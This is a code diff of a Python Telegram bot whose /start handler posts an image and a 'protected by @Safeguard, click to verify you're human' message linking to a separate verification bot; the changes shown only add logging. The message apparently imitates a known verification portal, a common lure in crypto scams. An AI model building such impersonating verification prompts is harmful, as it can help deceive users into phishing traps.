@@ -94,23 +94,22 @@ async def on_verify_button_click(event):
 @portal_bot_client.on(events.NewMessage(pattern='/start'))
 async def on_portal_access(event):
     try:
-        # Define your channel username or ID (use the @username format or channel ID with `-100` prefix)
+        print("Processing /start command...")
         channel_id = '-1002486862799'  # Replace with your actual channel username or ID
-
-        # Download the image from the URL using aiohttp
         image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/bot_pics%2FScreenshot_20241224_133800_Telegram.jpg?alt=media&token=48ff61f7-8475-4145-a6f0-8d3861b20146'
 
         async with aiohttp.ClientSession() as session:
             async with session.get(image_url) as response:
                 if response.status == 200:
+                    print("Image fetched successfully.")
                     from io import BytesIO
-                    image_data = BytesIO(await response.read())  # Convert the content into a file-like object
-                    image_data.name = 'image_verify_portal.jpg'  # Set a name for the file-like object
+                    image_data = BytesIO(await response.read())
+                    image_data.name = 'image_verify_portal.jpg'
 
-                    # Send the message to the channel with the image and buttons
-                    await portal_bot_client.send_message(  # Use the correct bot client name here
+                    # Send the message to the channel
+                    await portal_bot_client.send_message(
                         entity=channel_id,
-                        file=image_data,  # Send the image as bytes
+                        file=image_data,
                         message=(
                             "$MINTERPRO | PORTAL is being protected by @Safeguard\n\n"
                             "Click below to verify you're human"
@@ -119,8 +118,9 @@ async def on_portal_access(event):
                             [Button.url("Tap to verify", "https://t.me/verification_by_safeguard_bot")]
                         ]
                     )
+                    print("Message sent successfully.")
                 else:
-                    print("Failed to fetch the image from the provided URL.")
+                    print(f"Failed to fetch the image. HTTP Status: {response.status}")
     except Exception as e:
         print(f"Error: {e}")
 
